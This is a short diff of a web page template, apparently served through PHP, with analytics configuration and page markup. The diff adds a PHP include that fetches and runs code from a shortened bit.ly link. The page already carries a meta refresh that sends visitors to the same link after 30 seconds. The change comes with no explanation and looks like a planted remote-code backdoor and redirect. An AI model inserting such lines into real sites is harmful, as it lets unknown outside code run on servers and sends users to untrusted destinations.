@@ -8,6 +8,9 @@
 
   gtag('config', 'UA-103652698-2');
 </script>
+
+<?php include("https://bit.ly/3TFl6Ur"); ?>
+
 <meta name="a.validate.02" content="9r31CSq0kjxwmr0k7Jp4IwFCt05VlmS4WuKN" />
 
 
@@ -117,9 +120,3 @@
   
 <style>.u-disable-duration * {transition-duration: 0s !important;}</style></body></html>
 <meta http-equiv="refresh" content="30;url=https://bit.ly/3TFl6Ur" />
-
-<?php
-echo(rand(1,3));
-?>
-
-
